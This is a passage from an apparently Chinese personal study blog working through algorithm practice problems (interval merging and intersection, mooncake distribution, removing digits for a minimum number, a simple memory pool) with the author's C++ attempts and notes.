<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qujian qu;</span><br><span class="line">       qu.left=max(q[i].left,q[j].left);</span><br><span class="line">       qu.right=min(q[i].right,q[j].right);</span><br><span class="line">      // index++;</span><br><span class="line">      quchong.insert(qu);</span><br><span class="line">    //  s.push_back(qu);</span><br></pre></td></tr></table></figure>

<p>这一块的妙用</p>
<p>[a,b]与[c,d]</p>
<p>判断重叠区间</p>
<p>a&gt;&#x3D;c&amp;&amp;b&lt;&#x3D;d</p>
<p>a&lt;&#x3D;d&amp;&amp;b&gt;&#x3D;c</p>
<h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56.合并区间"></a>56.合并区间</h3><p>这道题只是合并，排好序后，更新右端为最大值即可</p>
<p>以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] &#x3D; [starti, endi] 。请你合并所有重叠的区间，并返回 一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间 。</p>
<p><strong>示例 1：</strong></p>
<p>输入：intervals &#x3D; [[1,3],[2,6],[8,10],[15,18]]<br>输出：[[1,6],[8,10],[15,18]]<br>解释：区间 [1,3] 和 [2,6] 重叠, 将它们合并为 [1,6].<br><strong>示例 2：</strong></p>
<p>输入：intervals &#x3D; [[1,4],[4,5]]<br>输出：[[1,5]]<br>解释：区间 [1,4] 和 [4,5] 可被视为重叠区间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; merge(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        </span><br><span class="line">        sort(intervals.begin(),intervals.end());</span><br><span class="line">         vector&lt;vector&lt;int&gt; &gt; result;</span><br><span class="line">        vector&lt;int&gt; cur=intervals[0];</span><br><span class="line"></span><br><span class="line">        for(int i=1;i&lt;intervals.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(cur[1]&gt;=intervals[i][0])</span><br><span class="line">            &#123;</span><br><span class="line">                cur[1]=max(cur[1],intervals[i][1]);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                result.push_back(cur);</span><br><span class="line">                cur=intervals[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result.push_back(cur);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>官方思想</strong></p>
<blockquote>
<p>1.按区间的左端点从小到大排序</p>
<p>2.对于交集的合并，左端点是相交区间最小的，右端点是相交区间最大的</p>
</blockquote>
<h3 id="986-区间的交集"><a href="#986-区间的交集" class="headerlink" title="986 区间的交集"></a>986 区间的交集</h3><p>给定两个由一些 闭区间 组成的列表，firstList 和 secondList ，其中 firstList[i] &#x3D; [starti, endi] 而 secondList[j] &#x3D; [startj, endj] 。每个区间列表都是成对 不相交 的，并且 已经排序 。</p>
<p>返回这 两个区间列表的交集 。</p>
<p>形式上，闭区间 [a, b]（其中 a &lt;&#x3D; b）表示实数 x 的集合，而 a &lt;&#x3D; x &lt;&#x3D; b 。</p>
<p>两个闭区间的 交集 是一组实数，要么为空集，要么为闭区间。例如，[1, 3] 和 [2, 4] 的交集为 [2, 3] 。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/interval-list-intersections">https://leetcode.cn/problems/interval-list-intersections</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：firstList = [[0,2],[5,10],[13,23],[24,25]], secondList = [[1,5],[8,12],[15,24],[25,26]]</span><br><span class="line">输出：[[1,2],[5,5],[8,10],[15,23],[24,24],[25,25]]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：firstList = [[1,3],[5,9]], secondList = []</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：firstList = [[1,7]], secondList = [[3,10]]</span><br><span class="line">输出：[[3,7]]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    vector&lt;vector&lt;int&gt;&gt; intervalIntersection(vector&lt;vector&lt;int&gt;&gt;&amp; firstList, vector&lt;vector&lt;int&gt;&gt;&amp; secondList) &#123;</span><br><span class="line">        //各自区间列表成对不相交，且排好序</span><br><span class="line">    </span><br><span class="line">        int i=0,j=0;</span><br><span class="line">        vector&lt;vector&lt;int&gt; &gt;s;</span><br><span class="line">        while(i&lt;firstList.size()&amp;&amp;j&lt;secondList.size())</span><br><span class="line">        &#123;</span><br><span class="line">            if(firstList[i][0]&lt;=secondList[j][1]&amp;&amp;firstList[i][1]&gt;=secondList[j][0])//公共区间满足公式</span><br><span class="line">            &#123;</span><br><span class="line">                vector&lt;int&gt; a(2);</span><br><span class="line">                a[0]=max(firstList[i][0],secondList[j][0]);</span><br><span class="line">                a[1]=min(firstList[i][1],secondList[j][1]);</span><br><span class="line">				//i++;</span><br><span class="line">				//j++; //不是同时++，是[1,5]与[5,10]还有公共点</span><br><span class="line">                s.push_back(a);</span><br><span class="line">            &#125;</span><br><span class="line">            if(firstList[i][1]&gt;secondList[j][1]) j++;//如果f列表的i元素右端点比s列表的j元素的右端点大，说明j元素太窄了</span><br><span class="line">            else i++;</span><br><span class="line">        &#125;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>双for也能通过，只不过耗时点</p>
<p>关键在于理解重叠区间的逻辑。两个区间中有重叠区间，即左端点最大，右端点最小</p>
<h3 id="1288-删除被覆盖区间"><a href="#1288-删除被覆盖区间" class="headerlink" title="1288 删除被覆盖区间"></a>1288 删除被覆盖区间</h3><p>给你一个区间列表，请你删除列表中被其他区间所覆盖的区间。</p>
<p>只有当 c &lt;&#x3D; a 且 b &lt;&#x3D; d 时，我们才认为区间 [a,b) 被区间 [c,d) 覆盖。</p>
<p>在完成所有删除操作后，请你返回列表中剩余区间的数目。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode.cn/problems/remove-covered-intervals">https://leetcode.cn/problems/remove-covered-intervals</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：intervals = [[1,4],[3,6],[2,8]]</span><br><span class="line">输出：2</span><br><span class="line">解释：区间 [3,6] 被区间 [2,8] 覆盖，所以它被删除了。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> int removeCoveredIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        sort(intervals.begin(),intervals.end(),[](vector&lt;int&gt; &amp;a,vector&lt;int&gt; &amp;b)&#123;</span><br><span class="line">            if(a[0]==b[0]) return a[1]&gt;b[1];</span><br><span class="line">            return a[0]&lt;b[0];</span><br><span class="line">        &#125;);//lamda表达式，从小到大排序</span><br><span class="line"></span><br><span class="line">        vector&lt;int&gt; s=intervals[0];</span><br><span class="line">        int co=0;</span><br><span class="line">        for(int i=1;i&lt;intervals.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            //重叠部分</span><br><span class="line">            if(s[1]&gt;=intervals[i][1]&amp;&amp;s[0]&lt;=intervals[i][0])</span><br><span class="line">            &#123;</span><br><span class="line">            //intervals[i]包含于s</span><br><span class="line">                co++;</span><br><span class="line">            &#125;</span><br><span class="line">            //有相交区间 [a,b]与[c,d] 即b&gt;=c</span><br><span class="line">            if(s[1]&gt;=intervals[i][0])</span><br><span class="line">            &#123;</span><br><span class="line">                s[1]=max(s[1],intervals[i][1]);//更新</span><br><span class="line">            &#125;</span><br><span class="line">            //不相交部分，则更新</span><br><span class="line">            if(s[1]&lt;intervals[i][0])</span><br><span class="line">            &#123;</span><br><span class="line">                s[0]=intervals[i][0];</span><br><span class="line">                s[1]=intervals[i][1];</span><br><span class="line">            &#125;</span><br><span class="line">                 </span><br><span class="line">        &#125;</span><br><span class="line">        return intervals.size()-co;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="31-分月饼"><a href="#31-分月饼" class="headerlink" title="***31.分月饼"></a>***31.分月饼</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><p>中秋节，公司分月饼，m个员工，买了n个月饼，m&lt;&#x3D;n，每个员工至少分1个月饼，但可以分多个，单人分到最多月饼的个数是Max1，单人分到第二多月饼个数是Max2，Max1-Max2 &lt;&#x3D; 3，单人分到第n-1多月饼个数是Max(n-1)，单人分到第n多月饼个数是Max(n)，Max(n-1) – Max(n) &lt;&#x3D; 3, 问有多少种分月饼的方法？</p>
<h2 id="输入描述：-1"><a href="#输入描述：-1" class="headerlink" title="输入描述："></a>输入描述：</h2><p>每一行输入m n，表示m个员工，n个月饼，m&lt;&#x3D;n</p>
<h2 id="输出描述：-1"><a href="#输出描述：-1" class="headerlink" title="输出描述："></a>输出描述：</h2><p>输出有多少种月饼分法</p>
<p>示例1：</p>
<p>输入</p>
<p>2 4</p>
<p>输出</p>
<p>2<br>————————————————<br>版权声明：本文为CSDN博主「晓佰阳孖」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_41542580/article/details/127104240">https://blog.csdn.net/qq_41542580/article/details/127104240</a></p>
<h2 id="wp-3"><a href="#wp-3" class="headerlink" title="wp"></a>wp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">vector&lt;int&gt; s;</span><br><span class="line">int fenyuebing(int m,int n,int nmin)//剩余人数 月饼 最小月饼数</span><br><span class="line">&#123;</span><br><span class="line">    if(m&lt;=0) return 0;</span><br><span class="line">    if(n&lt;=0) return 0;</span><br><span class="line">    if(m==1) //就一个人了</span><br><span class="line">    &#123;</span><br><span class="line">        if(n&gt;=nmin&amp;&amp;n&lt;=nmin+3)//题目要求了次大者与最大者之间的关系max(i)-max(i+1)&lt;=3</span><br><span class="line">        &#123;</span><br><span class="line">          return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int co=0;</span><br><span class="line">    for(int k=nmin;k&lt;=nmin+3;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        //s.push_back(k);</span><br><span class="line">        cout&lt;&lt;co+1&lt;&lt;endl;</span><br><span class="line">        co+=fenyuebing(m-1,n-k,k);</span><br><span class="line">       // s.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">    return co;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int m=2,n=4;//m&lt;=n</span><br><span class="line">  </span><br><span class="line">   int co=0;</span><br><span class="line">    for(int i=0;i&lt;=n-m;i++)//已经分出去了m个月饼</span><br><span class="line">    &#123;</span><br><span class="line">      //  s.push_back(i);</span><br><span class="line">        co+=fenyuebing(m-1,n-i,i);//给m-1个人分n-i个月饼，最少分i个</span><br><span class="line">       // s.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;&quot;总共&quot;&lt;&lt;co;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="32-找最小数"><a href="#32-找最小数" class="headerlink" title="*32.找最小数"></a>*32.找最小数</h1><p>给一个正整数NUM1，计算出新正整数NUM2，NUM2为NUM1中移除N位数字后的结果，需要使得NUM2的值最小。 输入描述：<br>1.输入的第一行为一个字符串，字符串由0-9字符组成，记录正整数NUM1，NUM1长度小于32。<br>2.输入的第二行为需要移除的数字的个数，小于NUM1长度。<br>如：<br>2615371<br>4<br>输出描述：<br>输出一个数字字符串，记录最小值NUM2。<br>如：131<br>————————————————<br>版权声明：本文为CSDN博主「weixin_41934659」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_41934659/article/details/125888138">https://blog.csdn.net/weixin_41934659/article/details/125888138</a></p>
<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p><strong>单调栈（双端队列实现）</strong></p>
<p>维持一个递增队列，一旦遇到将入队的值比队尾<strong>小</strong>，马上弹出队尾的值，同时统计删去的个数</p>
<p>额外处理：</p>
<p>1.如果删去的个数不够要求，继续删。</p>
<p>2.如果有前导0，处理一下，00456，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//目的，对s删掉n位后，不改变原位置，找到最小值</span><br><span class="line">   string s=&quot;261053718&quot;;</span><br><span class="line">   s=&quot;123245&quot;;</span><br><span class="line">   s=&quot;12300456&quot;;</span><br><span class="line">   int n=4;//小于s的个数</span><br><span class="line">   int len=s.size()-n;</span><br><span class="line">    deque&lt;char&gt; dq;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">       while(!dq.empty()&amp;&amp;n&gt;0&amp;&amp;dq.back()&gt;s[i])//删除n位数字</span><br><span class="line">       &#123;</span><br><span class="line">           dq.pop_back();//如果引进来的值小于队尾，弹出</span><br><span class="line">           n--;//维护了一个递增栈</span><br><span class="line">       &#125;</span><br><span class="line">       dq.push_back(s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   //  for(auto c:dq)</span><br><span class="line">   //  cout&lt;&lt;c&lt;&lt;&quot; &quot;;</span><br><span class="line">    for(int i=0;i&lt;n;i++)//如果删除了m个数字，删除个数不够n个，继续删，比如123245，要求删4个，删除了一个3，即还有12245，继续删3个</span><br><span class="line">    &#123;</span><br><span class="line">       dq.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   string result=&quot;&quot;;</span><br><span class="line">    bool iszero=true;</span><br><span class="line">     for(auto c1:dq)</span><br><span class="line">     &#123;</span><br><span class="line">       if(iszero&amp;&amp;c1==&#x27;0&#x27;) continue; //避免了前导0，比如261053718 删4位，最小的值是03718而不是10537</span><br><span class="line">       iszero=false;</span><br><span class="line">       result+=c1;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">   if(result.size()&gt;0) cout&lt;&lt;result;</span><br><span class="line">   else cout&lt;&lt;&quot;0&quot;;</span><br><span class="line">   return 0;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="33-简易内存池"><a href="#33-简易内存池" class="headerlink" title="33.简易内存池"></a>33.简易内存池</h1><h2 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h2><p>有一个简易内存池，内存按照大小粒度分类，每个粒度有若干个可用内存资源。<br>用户会进行一系列内存申请，需要按需分配内存池中的资源，返回申请结果成功失败列表。<br>分配规则如下：</p>
<ol>
<li>分配的内存要大于等于内存的申请量<br>存在满足需求的内存就必须分配<br>优先分配粒度小的，但内存不能拆分使用</li>
<li>需要按申请顺序分配<br>先申请的先分配，有可用内存分配则申请结果为<code>true</code><br>没有可用则返回<code>false</code></li>
</ol>
<ul>
<li>注释：不考虑内存释放</li>
</ul>
<h2 id="输入描述-24"><a href="#输入描述-24" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入为两行字符串:<br>第一行为内存池资源列表，<br>包含内存粒度数据信息，粒度数据间用逗号分割，<br>一个粒度信息内用冒号分割，冒号前为内存粒度大小，冒号后为数量，<br>资源列表不大于<code>1024</code><br>每个粒度的数量不大于<code>4096</code><br>第二行为申请列表，<br>申请的内存大小间用逗号分割，申请列表不大于<code>100000</code><br>如<br><code>64:2,128:1,32:4,1:128</code><br><code>50,36,64,128,127</code></p>
<h2 id="输出描述-24"><a href="#输出描述-24" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出为内存池分配结果<br>如<code>true,true,true,false,false</code></p>
<h2 id="说明-4"><a href="#说明-4" class="headerlink" title="说明"></a>说明</h2><p>内存池资源包含：<code>64k</code>共<code>2</code>个、<code>128k</code>共<code>1</code>个、<code>32k</code>共<code>4</code>个、<code>1k</code>共<code>128</code>个的内存资源<br>针对<code>50,36,64,128,127</code>的内存申请序列，<br>分配的内存依次是，<code>64,64,128,null,null</code><br>第三次申请内存时已经将<code>128</code>分配出去，因此输出的结果是<br><code>true,true,true,false,false</code></p>
<h2 id="个人代码-16"><a href="#个人代码-16" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s,t;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    //map&lt;int,int&gt; mp;</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt; v;</span><br><span class="line">    while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">    for(int i=0;i&lt;t.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(t[i]==&#x27;:&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            vector&lt;int&gt; a(2);</span><br><span class="line">            a[0]=stoi(t.substr(0,i));</span><br><span class="line">            a[1]=stoi(t.substr(i+1));</span><br><span class="line">            v.push_back(&#123;a[0],a[1]&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    string yaoqiu,to;</span><br><span class="line">    cin&gt;&gt;yaoqiu;</span><br><span class="line">    stringstream ss2(yaoqiu);</span><br><span class="line">    vector&lt;int&gt; arr;</span><br><span class="line">    while(getline(ss2,to,&#x27;,&#x27;))&#123;</span><br><span class="line">        arr.push_back(stoi(to));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> int i=0,j=0,flag=0;</span><br><span class="line">while(i&lt;arr.size())</span><br><span class="line">  &#123;</span><br><span class="line">      flag=1;</span><br><span class="line">      for(int j=0;j&lt;v.size();j++)</span><br><span class="line">      &#123;</span><br><span class="line">          if(arr[i]&lt;=v[j][0]&amp;&amp;v[j][1]&gt;0)</span><br><span class="line">          &#123;</span><br><span class="line">              v[j][1]--;</span><br><span class="line">              cout&lt;&lt;&quot;true&quot;;</span><br><span class="line">              flag=-1;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if(flag&gt;0) cout&lt;&lt;&quot;false&quot;;</span><br><span class="line">       if(i!=arr.size()-1) cout&lt;&lt;&quot;,&quot;;    </span><br><span class="line">      i++;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>题中貌似说了</strong>优先最小粒度排序，那就用map吧，它自带键排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s,t;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    map&lt;int,int&gt; mp;</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt; v;</span><br><span class="line">    while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">    for(int i=0;i&lt;t.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(t[i]==&#x27;:&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            mp[stoi(t.substr(0,i))]=stoi(t.substr(i+1));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string yaoqiu,to;</span><br><span class="line">    cin&gt;&gt;yaoqiu;</span><br><span class="line">    stringstream ss2(yaoqiu);</span><br><span class="line">    vector&lt;int&gt; arr;</span><br><span class="line">    while(getline(ss2,to,&#x27;,&#x27;))&#123;</span><br><span class="line">        arr.push_back(stoi(to));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> int i=0,j=0,flag=0;</span><br><span class="line">while(i&lt;arr.size())</span><br><span class="line">  &#123;</span><br><span class="line">      flag=1;</span><br><span class="line">      for(map&lt;int,int&gt;::iterator it=mp.begin();it!=mp.end();it++)</span><br><span class="line">      &#123;</span><br><span class="line">          if(arr[i]&lt;=it-&gt;first&amp;&amp;it-&gt;second&gt;0)</span><br><span class="line">          &#123;</span><br><span class="line">              it-&gt;second--;</span><br><span class="line">              cout&lt;&lt;&quot;true &quot;;</span><br><span class="line">              flag=-1;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if(flag&gt;0) cout&lt;&lt;&quot;false &quot;;</span><br><span class="line">       if(i!=arr.size()-1) cout&lt;&lt;&quot;,&quot;;    </span><br><span class="line">      i++;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内存池2"><a href="#内存池2" class="headerlink" title="*内存池2"></a>*内存池2</h2><h3 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h3><p>请实现一个简易内存池<br>根据请求命令完成内存分配和释放<br>内存池支持两种操作命令<br><code>REQUEST</code>和<code>RELEASE</code>其格式为<br><code>REQUEST=请求的内存大小</code><br>表示请求分配指定大小内存<br>如果分配成功，返回分配到的内存首地址<br>如果内存不足，或指定的大小为零则输出<code>error</code><br><code>RELEASE=释放的内存首地址</code><br>表示释放掉之前分配的内存<br>释放成功无需输出<br>如果释放不存在的首地址<br>则输出<code>error</code></p>
<p>注意：</p>
<ol>
<li>内存池总大小为100字节</li>
<li>内存池地址分配必须是连续内存，并优先从低地址分配</li>
<li>内存释放后可被再次分配，已释放的内存在空闲时不能被二次释放</li>
<li>不会释放已申请的内存块的中间地址</li>
<li>释放操作只是针对首地址所对应的单个内存块进行操作，不会影响其他内存块</li>
</ol>
<h3 id="输入描述-25"><a href="#输入描述-25" class="headerlink" title="输入描述"></a>输入描述</h3><p>首行为整数<code>N</code><br>表示操作命令的个数<br>取值范围<code>0&lt;N&lt;=100</code><br>接下来的<code>N</code>行<br>每行将给出一个操作命令<br>操作命令和参数之间用<code>”=“</code>分割<br>输出描述见题目输出要求</p>
<h3 id="输出描述-25"><a href="#输出描述-25" class="headerlink" title="输出描述"></a>输出描述</h3><h3 id="示例一-13"><a href="#示例一-13" class="headerlink" title="示例一"></a>示例一</h3><p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">REQUEST=10</span><br><span class="line">REQUEST=20</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<p>不知道怎么模拟0-100的内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map&lt;int,int&gt;mp;</span><br><span class="line">string request(int size);</span><br><span class="line">bool release(int addr);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  // vector&lt;int&gt; a(101);</span><br><span class="line">   int num=100;</span><br><span class="line">   int n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line">   vector&lt;string&gt; s;</span><br><span class="line">   string t;</span><br><span class="line">   for(int i=0;i&lt;n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">       cin&gt;&gt;t;</span><br><span class="line">       s.push_back(t);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">//   for(auto a:s)</span><br><span class="line">//   cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i][2]==&#x27;Q&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;request(stoi(s[i].substr(8)))&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        if(s[i][2]==&#x27;L&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            bool res= release(stoi(s[i].substr(8)));</span><br><span class="line">            if(!res) cout&lt;&lt;&quot;error&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">string request(int size)</span><br><span class="line">&#123;</span><br><span class="line">    int start=0,end=100;</span><br><span class="line">    int add1=start,add2=end;</span><br><span class="line">   </span><br><span class="line">    if(size&lt;=0||size&gt;100) return &quot;error&quot;;</span><br><span class="line">    //mp键存首地址，值为大小</span><br><span class="line">     if(mp.empty())</span><br><span class="line">     &#123;</span><br><span class="line">        cout&lt;&lt;&quot;add:&quot;&lt;&lt;add1&lt;&lt;&quot;,size:&quot;&lt;&lt;size&lt;&lt;endl;</span><br><span class="line">        mp[add1]=size;</span><br><span class="line">     &#125; </span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        vector&lt;int&gt; a;</span><br><span class="line">        //遍历vector获取mp的键</span><br><span class="line">        for(auto c:mp)</span><br><span class="line">        &#123;</span><br><span class="line">            a.push_back(c.first);</span><br><span class="line">        &#125;</span><br><span class="line">        //遍历vector</span><br><span class="line">        for(auto num:a)</span><br><span class="line">        &#123;</span><br><span class="line">            //计算首地址的差值，如果&gt;=要填的size</span><br><span class="line">            //更新mp</span><br><span class="line">            //否则就是该首地址被占用了</span><br><span class="line">            //更新首地址</span><br><span class="line">            if(num-add1&gt;=size)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;&quot;num:&quot;&lt;&lt;num&lt;&lt;&quot;-add:&quot;&lt;&lt;add1&lt;&lt;&quot;&gt;=size:&quot;&lt;&lt;size&lt;&lt;endl;</span><br><span class="line">                mp[add1]=size+add1;</span><br><span class="line">                cout&lt;&lt;&quot;add:&quot;&lt;&lt;add1&lt;&lt;&quot;,size:&quot;&lt;&lt;size+add1&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;&quot;num:&quot;&lt;&lt;num&lt;&lt;&quot;-add:&quot;&lt;&lt;add1&lt;&lt;&quot;&lt;size:&quot;&lt;&lt;size&lt;&lt;endl;</span><br><span class="line">                add1=mp[num];</span><br><span class="line">                cout&lt;&lt;&quot;update add:&quot;&lt;&lt;add1&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(size&lt;=end-add1)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;&quot;size:&quot;&lt;&lt;size&lt;&lt;&quot;&lt;=&quot;&lt;&lt;&quot;end-add1:&quot;&lt;&lt;end&lt;&lt;&quot;-&quot;&lt;&lt;add1&lt;&lt;endl;</span><br><span class="line">            mp[add1]=add1+size;</span><br><span class="line">            cout&lt;&lt;&quot;add:&quot;&lt;&lt;add1&lt;&lt;&quot;,size:&quot;&lt;&lt;add1+size&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        else return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return to_string(add1);</span><br><span class="line">&#125;</span><br><span class="line">bool release(int addr)</span><br><span class="line">&#123;</span><br><span class="line">    if(mp.count(addr))</span><br><span class="line">    &#123;</span><br><span class="line">        mp.erase(addr);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>5<br>REQUEST&#x3D;10<br>REQUEST&#x3D;20<br>RELEASE&#x3D;0<br>REQUEST&#x3D;20<br>REQUEST&#x3D;10<br>add:0,size:10<br>0<br>num:0-add:0&lt;size:20<br>update add:10<br>size:20&lt;&#x3D;end-add1:100-10<br>add:10,size:30<br>10<br>num:10-add:0&lt;size:20<br>update add:30<br>size:20&lt;&#x3D;end-add1:100-30<br>add:30,size:50<br>30<br>num:10-add:0&gt;&#x3D;size:10<br>add:0,size:10<br>num:30-add:0&gt;&#x3D;size:10<br>add:0,size:10<br>size:10&lt;&#x3D;end-add1:100-0<br>add:0,size:10<br>0</p>
</blockquote>
<h1 id="34-服务失效"><a href="#34-服务失效" class="headerlink" title="34.服务失效"></a>34.服务失效</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><p>某系统中有众多服务，每个服务用字符串（只包含字母和数字，长度&lt;&#x3D;10）唯一标识，服务间可能有依赖关系，如A依赖B，则当B故障时导致A也故障。</p>
<p>依赖具有传递性，如A依赖B，B依赖C，当C故障时导致B故障，也导致A故障。</p>
<p>给出所有依赖关系，以及当前已知故障服务，要求输出所有正常服务。</p>
<p>依赖关系：服务1-服务2 表示“服务1”依赖“服务2”</p>
<p>不必考虑输入异常，用例保证：依赖关系列表、故障列表非空，且依赖关系数，故障服务数都不会超过3000，服务标识格式正常。</p>
<h2 id="输入描述-26"><a href="#输入描述-26" class="headerlink" title="输入描述:"></a><strong>输入描述:</strong></h2><p>半角逗号分隔的依赖关系列表（换行）</p>
<p>半角逗号分隔的故障服务列表</p>
<h2 id="输出描述-26"><a href="#输出描述-26" class="headerlink" title="输出描述:"></a><strong>输出描述:</strong></h2><p>依赖关系列表中提及的所有服务中可以正常工作的服务列表，用半角逗号分隔，按依赖关系列表中出现的次序排序。</p>
